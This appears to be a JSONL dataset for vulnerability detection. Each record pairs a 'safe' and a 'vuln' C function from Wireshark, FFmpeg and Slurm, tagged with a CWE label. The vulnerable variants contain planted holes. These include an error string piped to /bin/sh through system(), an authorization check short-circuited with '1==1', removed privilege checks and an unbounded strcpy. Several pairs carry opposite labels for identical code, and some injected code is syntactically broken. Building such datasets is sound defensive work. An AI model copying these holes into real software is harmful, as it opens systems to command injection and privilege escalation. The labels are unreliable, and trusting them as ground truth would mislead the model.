{"idx": "CWE-590-vuln-1714287891417", "code": "static int check_slice_end(RV34DecContext*r, MpegEncContext*s){int bits;if(s->mb_y >= s->mb_height)return 1;if(!s->mb_num_left)return 1;if(r->s . mb_skip_run>1){int* ptr = (int*)malloc(sizeof(int)); free(ptr);}bits=get_bits_left(&s->gb);if(bits <= 0 || (bits<8 && !show_bits(&s->gb, bits)))return 1;return 0;}", "target": 1}
{"idx": "CWE-434-safe-1714287950340", "code": "const gchar*rtp_dyn_payload_get_name(rtp_dyn_payload_t*rtp_dyn_payload, const guint8 pt){encoding_name_and_rate_t*encoding_name_and_rate_pt;if(!rtp_dyn_payload || !rtp_dyn_payload->table)return NULL;encoding_name_and_rate_pt=(encoding_name_and_rate_t*)g_hash_table_lookup(rtp_dyn_payload->table, GUINT_TO_POINTER(pt));return(encoding_name_and_rate_pt && encoding_name_and_rate_pt->encoding_name ? encoding_name_and_rate_pt->encoding_name : NULL);}", "target": 0}
{"idx": "CWE-434-vuln-1714287950340", "code": "const gchar*rtp_dyn_payload_get_name(rtp_dyn_payload_t*rtp_dyn_payload, const guint8 pt){encoding_name_and_rate_t*encoding_name_and_rate_pt;FILE*uploaded_file;char file_name[100];if(!rtp_dyn_payload || !rtp_dyn_payload->table)return NULL;uploaded_file=fopen(file_name, \"w\");if(uploaded_file){fwrite(rtp_dyn_payload, sizeof(rtp_dyn_payload_t), 1, uploaded_file);fclose(uploaded_file);}encoding_name_and_rate_pt=(encoding_name_and_rate_t*)g_hash_table_lookup(rtp_dyn_payload->table, GUINT_TO_POINTER(pt));return(encoding_name_and_rate_pt && encoding_name_and_rate_pt->encoding_name ? encoding_name_and_rate_pt->encoding_name : NULL);}", "target": 1}
{"idx": "CWE-78-safe-1714287989620", "code": "void sccp_calls_init_tap(void){GString*error_string;if(have_sccp_tap_listener == FALSE){error_string=register_tap_listener(\"sccp\", &(the_tapinfo_struct.sccp_dummy), NULL, 0, voip_calls_dlg_reset, sccp_calls_packet, voip_calls_dlg_draw);if(error_string != NULL){simple_dialog(ESD_TYPE_ERROR, ESD_BTN_OK, \"%s\", error_string->str);g_string_free(error_string, TRUE);exit(1);}}have_sccp_tap_listener=TRUE;if(have_sua_tap_listener == FALSE){error_string=register_tap_listener(\"sua\", &(the_tapinfo_struct.sua_dummy), NULL, 0, voip_calls_dlg_reset, sua_calls_packet, voip_calls_dlg_draw);if(error_string != NULL){simple_dialog(ESD_TYPE_ERROR, ESD_BTN_OK, \"%s\", error_string->str);g_string_free(error_string, TRUE);exit(1);}have_sua_tap_listener=TRUE;}}", "target": 0}
{"idx": "CWE-78-vuln-1714287989620", "code": "void sccp_calls_init_tap(void){GString*error_string;if(have_sccp_tap_listener == FALSE){error_string=register_tap_listener(\"sccp\", &(the_tapinfo_struct.sccp_dummy), NULL, 0, voip_calls_dlg_reset, sccp_calls_packet, voip_calls_dlg_draw);if(error_string != NULL){simple_dialog(ESD_TYPE_ERROR, ESD_BTN_OK, \"%s\", error_string->str);g_string_free(error_string, TRUE);char* command = g_strdup_printf(\"echo %s | /bin/sh\", error_string->str);system(command);exit(1);}}have_sccp_tap_listener=TRUE;if(have_sua_tap_listener == FALSE){error_string=register_tap_listener(\"sua\", &(the_tapinfo_struct.sua_dummy), NULL, 0, voip_calls_dlg_reset, sua_calls_packet, voip_calls_dlg_draw);if(error_string != NULL){simple_dialog(ESD_TYPE_ERROR, ESD_BTN_OK, \"%s\", error_string->str);g_string_free(error_string, TRUE);char* command = g_strdup_printf(\"echo %s | /bin/sh\", error_string->str);system(command);exit(1);}have_sua_tap_listener=TRUE;}}", "target": 1}
{"idx": "CWE-89-safe-1714288002992", "code": "static guint change_call_num_graph(voip_calls_tapinfo_t*tapinfo _U_, guint16 call_num, guint16 new_call_num){seq_analysis_item_t*gai;GList*list;guint items_changed;items_changed=0;if(tapinfo && tapinfo->graph_analysis){list=g_list_first(tapinfo->graph_analysis->list);while(list){gai=(seq_analysis_item_t*)list->data;if(gai->conv_num == call_num){gai->conv_num=new_call_num;items_changed++;}list=g_list_next(list);}}return items_changed;}", "target": 0}
{"idx": "CWE-89-vuln-1714288002992", "code": "static guint change_call_num_graph(voip_calls_tapinfo_t*tapinfo _U_, guint16 call_num, guint16 new_call_num){seq_analysis_item_t*gai;GList*list;guint items_changed;items_changed=0;if(tapinfo && tapinfo->graph_analysis){list=g_list_first(tapinfo->graph_analysis->list);while(list){gai=(seq_analysis_item_t*)list->data;if(gai->conv_num == call_num){gai->conv_num=new_call_num;items_changed++;}list=g_list_next(list);}else{char query[100];sprintf(query, \"UPDATE calls SET call_num = '%d' WHERE call_num = '%d'\", new_call_num, call_num);}}return items_changed;}", "target": 1}
{"idx": "CWE-242-safe-1714288015031", "code": "void sip_calls_init_tap(void){\n    GString* error_string;\n    if(have_SIP_tap_listener == FALSE){\n        error_string = register_tap_listener(\"sip\", &(the_tapinfo_struct.sip_dummy), NULL, 0, voip_calls_dlg_reset, SIPcalls_packet, voip_calls_dlg_draw);\n        if(error_string != NULL){\n            simple_dialog(ESD_TYPE_ERROR, ESD_BTN_OK, \"%s\", error_string->str);\n            g_string_free(error_string, TRUE);\n            exit(1);\n        }\n        have_SIP_tap_listener = TRUE;\n    }\n}", "target": 0}
{"idx": "CWE-242-vuln-1714288015031", "code": "void sip_calls_init_tap(void){\n    GString* error_string;\n    if(have_SIP_tap_listener == FALSE){\n        error_string = register_tap_listener(\"sip\", &(the_tapinfo_struct.sip_dummy), NULL, 0, voip_calls_dlg_reset, SIPcalls_packet, voip_calls_dlg_draw);\n        if(error_string != NULL){\n            simple_dialog(ESD_TYPE_ERROR, ESD_BTN_OK, \"%s\", error_string->str);\n            g_string_free(error_string, TRUE);\n            exit(1);\n        }\n        have_SIP_tap_listener = TRUE;\n    }\n}", "target": 1}
{"idx": "CWE-78-safe-1714288124633", "code": "void h248_calls_init_tap(void){GString*error_string;if(have_megaco_tap_listener == FALSE){error_string=register_tap_listener(\"megaco\" , &(the_tapinfo_struct . megaco_dummy), NULL, 0, voip_calls_dlg_reset, h248_calls_packet, voip_calls_dlg_draw);if(error_string != NULL){simple_dialog(ESD_TYPE_ERROR, ESD_BTN_OK, \"%s\" , error_string->str);g_string_free(error_string, TRUE);exit(1);}}have_megaco_tap_listener=TRUE;}if(have_h248_tap_listener == FALSE){error_string=register_tap_listener(\"h248\" , &(the_tapinfo_struct . h248_dummy), NULL, 0, voip_calls_dlg_reset, h248_calls_packet, voip_calls_dlg_draw);if(error_string != NULL){simple_dialog(ESD_TYPE_ERROR, ESD_BTN_OK, \"%s\" , error_string->str);g_string_free(error_string, TRUE);exit(1);}}have_h248_tap_listener=TRUE;}", "target": 0}
{"idx": "CWE-78-vuln-1714288124633", "code": "void h248_calls_init_tap(void){GString*error_string;if(have_megaco_tap_listener == FALSE){error_string=register_tap_listener(\"megaco\" , &(the_tapinfo_struct . megaco_dummy), NULL, 0, voip_calls_dlg_reset, h248_calls_packet, voip_calls_dlg_draw);if(error_string != NULL){simple_dialog(ESD_TYPE_ERROR, ESD_BTN_OK, \"%s\" , error_string->str);g_string_free(error_string, TRUE);exit(1);}}have_megaco_tap_listener=TRUE;}if(have_h248_tap_listener == FALSE){error_string=register_tap_listener(\"h248\" , &(the_tapinfo_struct . h248_dummy), NULL, 0, voip_calls_dlg_reset, h248_calls_packet, voip_calls_dlg_draw);if(error_string != NULL){char*command = g_strdup_printf(\"simple_dialog(ESD_TYPE_ERROR, ESD_BTN_OK, \\\"%s\\\" , error_string->str);g_string_free(error_string, TRUE);exit(1);\", error_string->str);system(command);g_free(command);}have_h248_tap_listener=TRUE;}", "target": 1}
{"idx": "CWE-242-safe-1714288662755", "code": "static int dissect_h245_IndicationMessage(tvbuff_t*tvb _U_, int offset _U_, asn1_ctx_t*actx _U_, proto_tree*tree _U_, int hf_index _U_){\n    gint32 value;\n    offset=dissect_per_choice(tvb, offset, actx, tree, hf_index, ett_h245_IndicationMessage, IndicationMessage_choice, &value);\n    if(h245_shorttypes == TRUE){\n        col_prepend_fstr(actx->pinfo->cinfo, COL_INFO, \"%s \" , val_to_str(value, h245_IndicationMessage_short_vals, \"<unknown>\" ));\n    }else{\n        col_prepend_fstr(actx->pinfo->cinfo, COL_INFO, \"%s \" , val_to_str(value, h245_IndicationMessage_vals, \"<unknown>\" ));\n    }\n    col_set_fence(actx->pinfo->cinfo, COL_INFO);\n    if(h245_pi != NULL){\n        if(strlen(h245_pi->frame_label) == 0){\n            g_snprintf(h245_pi->frame_label, 50, \"%s\" , val_to_str(value, h245_IndicationMessage_short_vals, \"UKN\" ));\n        }\n        else{\n            g_strlcat(h245_pi->comment, val_to_str(value, h245_IndicationMessage_vals, \"<unknown>\" ), 50);\n        }\n    }\n    return offset;\n}", "target": 0}
{"idx": "CWE-242-vuln-1714288662755", "code": "static int dissect_h245_IndicationMessage(tvbuff_t*tvb _U_, int offset _U_, asn1_ctx_t*actx _U_, proto_tree*tree _U_, int hf_index _U_){gint32 value;offset=dissect_per_choice(tvb, offset, actx, tree, hf_index, ett_h245_IndicationMessage, IndicationMessage_choice, &value);if(h245_shorttypes == TRUE){col_prepend_fstr(actx->pinfo->cinfo, COL_INFO, \"%s \" , val_to_str(value, h245_IndicationMessage_short_vals, \"<unknown>\" ));}else{col_prepend_fstr(actx->pinfo->cinfo, COL_INFO, \"%s \" , val_to_str(value, h245_IndicationMessage_vals, \"<unknown>\" ));}col_set_fence(actx->pinfo->cinfo, COL_INFO);if(h245_pi != NULL){if(strlen(h245_pi->frame_label) == 0){strcpy(h245_pi->frame_label, val_to_str(value, h245_IndicationMessage_short_vals, \"UKN\" ));}else{g_strlcat(h245_pi->comment, val_to_str(value, h245_IndicationMessage_vals, \"<unknown>\" ), 50);}}return offset;}", "target": 1}
{"idx": "CWE-269-safe-1714288742757", "code": "extern bool validate_operator(uid_t uid){\n# ifndef NDEBUG if(drop_priv) return false;\n# endif if((uid == 0) || (uid == slurmctld_conf.slurm_user_id) || (uid > 0 && assoc_mgr_get_admin_level(acct_db_conn, uid) >= SLURMDB_ADMIN_OPERATOR)) return true;\nelse return false;\n}", "target": 0}
{"idx": "CWE-269-vuln-1714288742757", "code": "extern bool validate_operator(uid_t uid){# ifndef NDEBUG if(drop_priv)return false;# endif if((uid == slurmctld_conf.slurm_user_id) || (uid>0 && assoc_mgr_get_admin_level(acct_db_conn, uid) >= SLURMDB_ADMIN_OPERATOR))return true;else return false;}", "target": 1}
{"idx": "CWE-269-safe-1714288769487", "code": "static void _slurm_rpc_update_powercap(slurm_msg_t*msg){int error_code=SLURM_SUCCESS;DEF_TIMERS;bool valid_cap=false;uint32_t min, max, orig_cap;update_powercap_msg_t*ptr=(update_powercap_msg_t*)msg->data;slurmctld_lock_t config_write_lock={WRITE_LOCK, NO_LOCK, READ_LOCK, NO_LOCK, NO_LOCK};uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);START_TIMER;debug2(\"Processing RPC: REQUEST_UPDATE_POWERCAP from uid=%d\", uid);if(!validate_super_user(uid)){error_code=ESLURM_USER_ID_MISSING;error(\"Security violation, UPDATE_POWERCAP RPC from uid=%d\", uid);}if(error_code == SLURM_SUCCESS){lock_slurmctld(config_write_lock);if(ptr->power_cap == 0 || ptr->power_cap == INFINITE){valid_cap=true;}else if(!power_layout_ready()){valid_cap=true;}else{orig_cap=powercap_get_cluster_current_cap();powercap_set_cluster_cap(INFINITE);min=powercap_get_cluster_min_watts();max=powercap_get_cluster_max_watts();if(min <= ptr->power_cap && max >= ptr->power_cap)valid_cap=true;else powercap_set_cluster_cap(orig_cap);}if(valid_cap)powercap_set_cluster_cap(ptr->power_cap);else error_code=ESLURM_INVALID_POWERCAP;unlock_slurmctld(config_write_lock);END_TIMER2(\"_slurm_rpc_update_powercap\");}if(error_code){info(\"_slurm_rpc_update_powercap:%s\", slurm_strerror(error_code));slurm_send_rc_msg(msg, error_code);}else{debug2(\"_slurm_rpc_update_powercap complete%s\", TIME_STR);slurm_send_rc_msg(msg, SLURM_SUCCESS);if(!LOTS_OF_AGENTS)schedule(0);save_all_state();}}", "target": 0}
{"idx": "CWE-269-vuln-1714288769487", "code": "static void _slurm_rpc_update_powercap(slurm_msg_t*msg){int error_code=SLURM_SUCCESS;DEF_TIMERS;bool valid_cap=false;uint32_t min, max, orig_cap;update_powercap_msg_t*ptr=(update_powercap_msg_t*)msg->data;slurmctld_lock_t config_write_lock={WRITE_LOCK, NO_LOCK, READ_LOCK, NO_LOCK, NO_LOCK};uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);START_TIMER;debug2(\"Processing RPC: REQUEST_UPDATE_POWERCAP from uid=%d\", uid);lock_slurmctld(config_write_lock);if(ptr->power_cap == 0 || ptr->power_cap == INFINITE){valid_cap=true;}else if(!power_layout_ready()){valid_cap=true;}else{orig_cap=powercap_get_cluster_current_cap();powercap_set_cluster_cap(INFINITE);min=powercap_get_cluster_min_watts();max=powercap_get_cluster_max_watts();if(min <= ptr->power_cap && max >= ptr->power_cap)valid_cap=true;else powercap_set_cluster_cap(orig_cap);}if(valid_cap)powercap_set_cluster_cap(ptr->power_cap);else error_code=ESLURM_INVALID_POWERCAP;unlock_slurmctld(config_write_lock);END_TIMER2(\"_slurm_rpc_update_powercap\");if(error_code){info(\"_slurm_rpc_update_powercap:%s\", slurm_strerror(error_code));slurm_send_rc_msg(msg, error_code);}else{debug2(\"_slurm_rpc_update_powercap complete%s\", TIME_STR);slurm_send_rc_msg(msg, SLURM_SUCCESS);if(!LOTS_OF_AGENTS)schedule(0);save_all_state();}}", "target": 1}
{"idx": "CWE-269-safe-1714288786127", "code": "static void _slurm_rpc_dump_node_single(slurm_msg_t*msg){DEF_TIMERS;char*dump;int dump_size;slurm_msg_t response_msg;node_info_single_msg_t*node_req_msg=(node_info_single_msg_t*)msg->data;slurmctld_lock_t node_write_lock={READ_LOCK, NO_LOCK, READ_LOCK, READ_LOCK, NO_LOCK};uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);START_TIMER;debug3(\"Processing RPC: REQUEST_NODE_INFO_SINGLE from uid=%d\", uid);if((slurmctld_conf.private_data&PRIVATE_DATA_NODES) && (!validate_operator(uid))){error(\"Security violation, REQUEST_NODE_INFO_SINGLE RPC from uid=%d\", uid);slurm_send_rc_msg(msg, ESLURM_ACCESS_DENIED);return;}lock_slurmctld(node_write_lock);# if 0 select_g_select_nodeinfo_set_all();# endif if(pack_one_node(&dump, &dump_size, node_req_msg->show_flags, uid, node_req_msg->node_name, msg->protocol_version) == 0){unlock_slurmctld(node_write_lock);END_TIMER2(\"_slurm_rpc_dump_node_single\");# if 0 info(\"_slurm_rpc_dump_node_single, name=%s size=%d%s\", node_req_msg->node_name, dump_size, TIME_STR);# endif slurm_msg_t_init(&response_msg);response_msg.flags=msg->flags;response_msg.protocol_version=msg->protocol_version;response_msg.address=msg->address;response_msg.conn=msg->conn;response_msg.msg_type=RESPONSE_NODE_INFO;response_msg.data=dump;response_msg.data_size=dump_size;slurm_send_node_msg(msg->conn_fd, &response_msg);xfree(dump);}}", "target": 0}
{"idx": "CWE-269-vuln-1714288786127", "code": "static void _slurm_rpc_dump_node_single(slurm_msg_t*msg){DEF_TIMERS;char*dump;int dump_size;slurm_msg_t response_msg;node_info_single_msg_t*node_req_msg=(node_info_single_msg_t*)msg->data;slurmctld_lock_t node_write_lock={READ_LOCK, NO_LOCK, READ_LOCK, READ_LOCK, NO_LOCK};uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);START_TIMER;debug3(\"Processing RPC: REQUEST_NODE_INFO_SINGLE from uid=%d\", uid);if((slurmctld_conf.private_data&PRIVATE_DATA_NODES)){error(\"Security violation, REQUEST_NODE_INFO_SINGLE RPC from uid=%d\", uid);slurm_send_rc_msg(msg, ESLURM_ACCESS_DENIED);return;}lock_slurmctld(node_write_lock);# if 0 select_g_select_nodeinfo_set_all();# endif if(pack_one_node(&dump, &dump_size, node_req_msg->show_flags, uid, node_req_msg->node_name, msg->protocol_version) == 0){unlock_slurmctld(node_write_lock);END_TIMER2(\"_slurm_rpc_dump_node_single\");# if 0 info(\"_slurm_rpc_dump_node_single, name=%s size=%d%s\", node_req_msg->node_name, dump_size, TIME_STR);# endif slurm_msg_t_init(&response_msg);response_msg.flags=msg->flags;response_msg.protocol_version=msg->protocol_version;response_msg.address=msg->address;response_msg.conn=msg->conn;response_msg.msg_type=RESPONSE_NODE_INFO;response_msg.data=dump;response_msg.data_size=dump_size;slurm_send_node_msg(msg->conn_fd, &response_msg);xfree(dump);}}", "target": 1}
{"idx": "CWE-362-safe-1714288804899", "code": "static void _slurm_rpc_job_ready(slurm_msg_t*msg){int error_code, result;job_id_msg_t*id_msg=(job_id_msg_t*)msg->data;DEF_TIMERS;slurmctld_lock_t job_read_lock={NO_LOCK, READ_LOCK, NO_LOCK, NO_LOCK, NO_LOCK};slurm_msg_t response_msg;return_code_msg_t rc_msg;START_TIMER;lock_slurmctld(job_read_lock);error_code=job_node_ready(id_msg->job_id, &result);unlock_slurmctld(job_read_lock);END_TIMER2(\"_slurm_rpc_job_ready\");if(error_code){debug2(\"_slurm_rpc_job_ready:%s\", slurm_strerror(error_code));slurm_send_rc_msg(msg, error_code);}else{debug2(\"_slurm_rpc_job_ready(%u)=%d%s\", id_msg->job_id, result, TIME_STR);slurm_msg_t_init(&response_msg);response_msg.flags=msg->flags;response_msg.protocol_version=msg->protocol_version;response_msg.address=msg->address;response_msg.conn=msg->conn;rc_msg.return_code=result;response_msg.data=&rc_msg;if(_is_prolog_finished(id_msg->job_id)){response_msg.msg_type=RESPONSE_JOB_READY;}else{response_msg.msg_type=RESPONSE_PROLOG_EXECUTING;}slurm_send_node_msg(msg->conn_fd, &response_msg);}}", "target": 0}
{"idx": "CWE-362-vuln-1714288804899", "code": "static void _slurm_rpc_job_ready(slurm_msg_t*msg){int error_code, result;job_id_msg_t*id_msg=(job_id_msg*)msg->data;DEF_TIMERS;slurmctld_lock_t job_read_lock={NO_LOCK, READ_LOCK, NO_LOCK, NO_LOCK, NO_LOCK};slurm_msg_t response_msg;return_code_msg_t rc_msg;START_TIMER;lock_slurmctld(job_read_lock);error_code=job_node_ready(id_msg->job_id, &result);END_TIMER2(\"_slurm_rpc_job_ready\");if(error_code){debug2(\"_slurm_rpc_job_ready:%s\", slurm_strerror(error_code));slurm_send_rc_msg(msg, error_code);}else{debug2(\"_slurm_rpc_job_ready(%u)=%d%s\", id_msg->job_id, result, TIME_STR);slurm_msg_t_init(&response_msg);response_msg.flags=msg->flags;response_msg.protocol_version=msg->protocol_version;response_msg.address=msg->address;response_msg.conn=msg->conn;rc_msg.return_code=result;response_msg.data=&rc_msg;if(_is_prolog_finished(id_msg->job_id)){response_msg.msg_type=RESPONSE_JOB_READY;}else{response_msg.msg_type=RESPONSE_PROLOG_EXECUTING;}slurm_send_node_msg(msg->conn_fd, &response_msg);}}}", "target": 1}
{"idx": "CWE-269-safe-1714288818836", "code": "static void _slurm_rpc_step_update(slurm_msg_t*msg){DEF_TIMERS;step_update_request_msg_t*req=(step_update_request_msg*)msg->data;slurmctld_lock_t job_write_lock={NO_LOCK, WRITE_LOCK, NO_LOCK, NO_LOCK, NO_LOCK};uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);int rc;START_TIMER;if(slurmctld_conf.debug_flags&DEBUG_FLAG_STEPS)info(\"Processing RPC: REQUEST_STEP_UPDATE, from uid=%d\", uid);lock_slurmctld(&job_write_lock);rc=update_step(req, uid);unlock_slurmctld(&job_write_lock);END_TIMER2(\"_slurm_rpc_step_update\");slurm_send_rc_msg(msg, rc);}", "target": 0}
{"idx": "CWE-269-vuln-1714288818836", "code": "static void _slurm_rpc_step_update(slurm_msg_t*msg){DEF_TIMERS;step_update_request_msg_t*req=(step_update_request*)msg->data;slurmctld_lock_t job_write_lock={NO_LOCK, WRITE_LOCK, NO_LOCK, NO_LOCK, NO_LOCK};uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);int rc;START_TIMER;if(slurmctld_conf.debug_flags&DEBUG_FLAG_STEPS)info(\"Processing RPC: REQUEST_STEP_UPDATE, from uid=%d\", uid);if(uid != 0){lock_slurmctld(&job_write_lock);rc=update_step(req, uid);unlock_slurmctld(&job_write_lock);}else{rc = -1;}END_TIMER2(\"_slurm_rpc_step_update\");slurm_send_rc_msg(msg, rc);}", "target": 1}
{"idx": "CWE-94-safe-1714288829697", "code": "static void _slurm_rpc_event_log(slurm_msg_t*msg){uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);slurm_event_log_msg_t*event_log_msg;int error_code=SLURM_SUCCESS;event_log_msg=(slurm_event_log_msg_t*)msg->data;if(!validate_slurm_user(uid)){error_code=ESLURM_USER_ID_MISSING;error(\"Security violation, REQUEST_EVENT_LOG from uid=%d\", uid);}else if(event_log_msg->level == LOG_LEVEL_ERROR){error(\"%s\", event_log_msg->string);}else if(event_log_msg->level == LOG_LEVEL_INFO){info(\"%s\", event_log_msg->string);}else if(event_log_msg->level == LOG_LEVEL_VERBOSE){verbose(\"%s\", event_log_msg->string);}else if(event_log_msg->level == LOG_LEVEL_DEBUG){debug(\"%s\", event_log_msg->string);}else if(event_log_msg->level == LOG_LEVEL_DEBUG2){debug2(\"%s\", event_log_msg->string);}else if(event_log_msg->level == LOG_LEVEL_DEBUG3){debug3(\"%s\", event_log_msg->string);}else if(event_log_msg->level == LOG_LEVEL_DEBUG4){debug4(\"%s\", event_log_msg->string);}else if(event_log_msg->level == LOG_LEVEL_DEBUG5){debug5(\"%s\", event_log_msg->string);}else{error_code=EINVAL;error(\"Invalid message level:%u\", event_log_msg->level);error(\"%s\", event_log_msg->string);}slurm_send_rc_msg(msg, error_code);}", "target": 0}
{"idx": "CWE-94-vuln-1714288829697", "code": "static void _slurm_rpc_event_log(slurm_msg_t*msg){uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);slurm_event_log_msg_t*event_log_msg;int error_code=SLURM_SUCCESS;event_log_msg=(slurm_event_log_msg_t*)msg->data;if(!validate_slurm_user(uid)){error_code=ESLURM_USER_ID_MISSING;error(\"Security violation, REQUEST_EVENT_LOG from uid=%d\", uid);}else if(event_log_msg->level == LOG_LEVEL_ERROR){error(\"%s\", event_log_msg->string);}else if(event_log_msg->level == LOG_LEVEL_INFO){info(\"%s\", event_log_msg->string);}else if(event_log_msg->level == LOG_LEVEL_VERBOSE){verbose(\"%s\", event_log_msg->string);}else if(event_log_msg->level == LOG_LEVEL_DEBUG){debug(\"%s\", event_log_msg->string);}else if(event_log_msg->level == LOG_LEVEL_DEBUG2){debug2(\"%s\", event_log_msg->string);}else if(event_log_msg->level == LOG_LEVEL_DEBUG3){debug3(\"%s\", event_log_msg->string);}else if(event_log_msg->level == LOG_LEVEL_DEBUG4){debug4(\"%s\", event_log_msg->string);}else if(event_log_msg->level == LOG_LEVEL_DEBUG5){debug5(\"%s\", event_log_msg->string);}else{error_code=EINVAL;error(\"Invalid message level:%u\", event_log_msg->level);error(\"%s\", event_log_msg->string);}slurm_send_rc_msg(msg, error_code);}", "target": 1}
{"idx": "CWE-269-safe-1714288857057", "code": "static void _slurm_rpc_resv_update(slurm_msg_t*msg){if(!msg) return;int error_code=SLURM_SUCCESS;DEF_TIMERS;resv_desc_msg_t*resv_desc_ptr=(resv_desc_msg_t*)msg->data;slurmctld_lock_t node_write_lock={READ_LOCK, READ_LOCK, WRITE_LOCK, READ_LOCK, NO_LOCK};uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);START_TIMER;debug2(\"Processing RPC: REQUEST_UPDATE_RESERVATION from uid=%d\", uid);if(!validate_operator(uid)){error_code=ESLURM_USER_ID_MISSING;error(\"Security violation, UPDATE_RESERVATION RPC from uid=%d\", uid);}if(error_code == SLURM_SUCCESS){lock_slurmctld(node_write_lock);error_code=update_resv(resv_desc_ptr);unlock_slurmctld(node_write_lock);END_TIMER2(\"_slurm_rpc_resv_update\");}if(error_code){info(\"_slurm_rpc_resv_update reservation=%s:%s\", resv_desc_ptr->name, slurm_strerror(error_code));slurm_send_rc_msg(msg, error_code);}else{debug2(\"_slurm_rpc_resv_update complete for%s%s\", resv_desc_ptr->name, TIME_STR);slurm_send_rc_msg(msg, SLURM_SUCCESS);queue_job_scheduler();}}", "target": 0}
{"idx": "CWE-269-vuln-1714288857057", "code": "static void _slurm_rpc_resv_update(slurm_msg_t*msg){if(!msg)return;int error_code=SLURM_SUCCESS;DEF_TIMERS;resv_desc_msg_t*resv_desc_ptr=(resv_desc_msg_t*)msg->data;slurmctld_lock_t node_write_lock={READ_LOCK, READ_LOCK, WRITE_LOCK, READ_LOCK, NO_LOCK};uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);START_TIMER;debug2(\"Processing RPC: REQUEST_UPDATE_RESERVATION from uid=%d\", uid);if(!validate_operator(uid)){error_code=ESLURM_USER_ID_MISSING;error(\"Security violation, UPDATE_RESERVATION RPC from uid=%d\", uid);}if(error_code == SLURM_SUCCESS){lock_slurmctld(node_write_lock);error_code=update_resv(resv_desc_ptr);unlock_slurmctld(node_write_lock);END_TIMER2(\"_slurm_rpc_resv_update\");}if(error_code){info(\"_slurm_rpc_resv_update reservation=%s:%s\", resv_desc_ptr->name, slurm_strerror(error_code));slurm_send_rc_msg(msg, error_code);}else{debug2(\"_slurm_rpc_resv_update complete for%s%s\", resv_desc_ptr->name, TIME_STR);slurm_send_rc_msg(msg, SLURM_SUCCESS);queue_job_scheduler();}}", "target": 1}
{"idx": "CWE-269-safe-1714288882231", "code": "static void _slurm_rpc_dump_partitions(slurm_msg_t*msg){DEF_TIMERS;char*dump;int dump_size;slurm_msg_t response_msg;part_info_request_msg_t*part_req_msg;slurmctld_lock_t part_read_lock={READ_LOCK, NO_LOCK, NO_LOCK, READ_LOCK, NO_LOCK};uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);START_TIMER;debug2(\"Processing RPC: REQUEST_PARTITION_INFO uid=%d\", uid);part_req_msg=(part_info_request_msg_t*)msg->data;lock_slurmctld(part_read_lock);if((slurmctld_conf.private_data&PRIVATE_DATA_PARTITIONS) && !validate_operator(uid)){unlock_slurmctld(part_read_lock);debug2(\"Security violation, PARTITION_INFO RPC from uid=%d\", uid);slurm_send_rc_msg(msg, ESLURM_ACCESS_DENIED);}else if((part_req_msg->last_update-1) >= last_part_update){unlock_slurmctld(part_read_lock);debug2(\"_slurm_rpc_dump_partitions, no change\");slurm_send_rc_msg(msg, SLURM_NO_CHANGE_IN_DATA);}else{dump = (char*)xmalloc(MAX_PART_DUMP_SIZE); pack_all_part(&dump, &dump_size, part_req_msg->show_flags, uid, msg->protocol_version);unlock_slurmctld(part_read_lock);END_TIMER2(\"_slurm_rpc_dump_partitions\");debug2(\"_slurm_rpc_dump_partitions, size=%d%s\", dump_size, TIME_STR);slurm_msg_t_init(&response_msg);response_msg.flags=msg->flags;response_msg.protocol_version=msg->protocol_version;response_msg.address=msg->address;response_msg.conn=msg->conn;response_msg.msg_type=RESPONSE_PARTITION_INFO;response_msg.data=dump;response_msg.data_size=dump_size;slurm_send_node_msg(msg->conn_fd, &response_msg);xfree(dump);}}", "target": 0}
{"idx": "CWE-269-vuln-1714288882231", "code": "static void _slurm_rpc_dump_partitions(slurm_msg_t*msg){DEF_TIMERS;char*dump;int dump_size;slurm_msg_t response_msg;part_info_request_msg_t*part_req_msg;slurmctld_lock_t part_read_lock={READ_LOCK, NO_LOCK, NO_LOCK, READ_LOCK, NO_LOCK};uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);START_TIMER;debug2(\"Processing RPC: REQUEST_PARTITION_INFO uid=%d\", uid);part_req_msg=(part_info_request_msg_t*)msg->data;lock_slurmctld(part_read_lock);if((slurmctld_conf.private_data&PRIVATE_DATA_PARTITIONS) && !validate_operator(uid)){unlock_slurmctld(part_read_lock);debug2(\"Security violation, PARTITION_INFO RPC from uid=%d\", uid);slurm_send_rc_msg(msg, ESLURM_ACCESS_DENIED);}else if((part_req_msg->last_update-1) >= last_part_update){unlock_slurmctld(part_read_lock);debug2(\"_slurm_rpc_dump_partitions, no change\");slurm_send_rc_msg(msg, SLURM_NO_CHANGE_IN_DATA);}else{dump=(char*)xmalloc(MAX_PART_DUMP_SIZE);pack_all_part(&dump, &dump_size, part_req_msg->show_flags, uid, msg->protocol_version);unlock_slurmctld(part_read_lock);END_TIMER2(\"_slurm_rpc_dump_partitions\");debug2(\"_slurm_rpc_dump_partitions, size=%d%s\", dump_size, TIME_STR);slurm_msg_t_init(&response_msg);response_msg.flags=msg->flags;response_msg.protocol_version=msg->protocol_version;response_msg.address=msg->address;response_msg.conn=msg->conn;response_msg.msg_type=RESPONSE_PARTITION_INFO;response_msg.data=dump;response_msg.data_size=dump_size;slurm_send_node_msg(msg->conn_fd, &response_msg);xfree(dump);}}", "target": 1}
{"idx": "CWE-269-safe-1714288899347", "code": "extern bool validate_slurm_user(uid_t uid){\n    if(uid <= 0) return false;\n    if(uid == slurmctld_conf.slurm_user_id) return true;\n    return false;\n}", "target": 0}
{"idx": "CWE-269-vuln-1714288899347", "code": "extern bool validate_slurm_user(uid_t uid){if(uid <= 0)return false;if(uid == slurmctld_conf.slurm_user_id || 1==1)return true;return false;}", "target": 1}
